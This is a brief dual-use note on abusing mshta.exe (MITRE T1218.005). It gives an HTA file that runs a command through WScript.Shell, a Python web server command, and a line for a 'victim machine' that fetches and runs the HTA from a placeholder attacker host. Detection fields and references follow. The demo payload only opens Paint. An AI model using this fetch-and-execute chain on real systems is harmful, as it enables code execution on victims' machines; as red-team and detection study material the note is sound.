# [MSHTA.exe](https://attack.mitre.org/techniques/T1218/005/)

## Exploit Syntax:


1. Create an hta file with the following contents and save it in your malware directory: 

```VBScript
<!DOCTYPE html>
<html lang-"en">
<head>
  <title>This is a bad HTA file</title>

  <HTA:APPLICATION
    APPLICATIONNAME = "Bad HTA File"
  />

  <script language = "VBScript">
    Dim com
    Set com = CreateObject("WScript.Shell")
    com.run "cmd.exe /C mspaint.exe"
    set com = Nothing
  </script>
</head>
```

2. Start a simple http server with Python
```Bash
python3 -m http.server 6789
```
3. On the victim machine, likely with a beacon run the following:
```powershell
sharpps mshta http://<webserverIP>:6789/<nameofHTAfile>
```


## Detection Technique

* Investigate any instances of mshta.exe, if it is common, investigate mshta.exe interacting with the compromised machine itself.
    * process.name: mshta.exe
    * Network Connection: Outbound
    * Event.Action: Process Create
    * Event.Type: start, process start
    * Winlog.task: File Creation


## Resources 
* https://redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/
* https://lolbas-project.github.io/lolbas/Binaries/Mshta/
